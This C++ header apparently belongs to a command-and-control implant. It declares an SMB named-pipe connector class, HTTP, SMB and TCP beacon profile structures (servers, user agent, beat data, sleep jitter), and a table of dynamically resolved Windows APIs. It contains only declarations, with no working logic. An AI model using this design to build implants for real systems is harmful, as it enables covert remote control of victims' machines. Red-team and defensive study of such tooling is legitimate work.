#pragma once

#include <windows.h>
#include "Connector.h"
#include <aclapi.h>

#define _NO_NTDLL_CRT_
#include "ntdll.h"

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;
#endif

#define DECL_API(x) decltype(x) * x

struct SMBFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(ReadFile);
	DECL_API(WriteFile);

	DECL_API(NtClose);

	//kernel32
	DECL_API(ConnectNamedPipe);
	DECL_API(DisconnectNamedPipe);
	DECL_API(CreateNamedPipeA);
	DECL_API(FlushFileBuffers);
	DECL_API(PeekNamedPipe);

	//advapi32
	DECL_API(AllocateAndInitializeSid);
	DECL_API(InitializeSecurityDescriptor);
	DECL_API(FreeSid);
	DECL_API(SetEntriesInAclA);
	DECL_API(SetSecurityDescriptorDacl);
};

class ConnectorSMB : public Connector
{
	CHAR* pipename = nullptr;

	BYTE* recvData   = nullptr;
	int   recvSize   = 0;
	ULONG allocaSize = 0;

	SMBFUNC* functions = nullptr;

	HANDLE hChannel = nullptr;

	BYTE* beat     = nullptr;
	ULONG beatSize = 0;
	BOOL  connected = FALSE;

public:
	ConnectorSMB();

	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
	BOOL WaitForConnection() override;
	BOOL IsConnected() override;
	void Disconnect() override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	void CloseConnector() override;

	BYTE* RecvData() override;
	int   RecvSize() override;
	void  RecvClear() override;

	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override {}

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;

private:
	void SendData(BYTE* data, ULONG data_size);
	void Listen();
	void DisconnectInternal();
};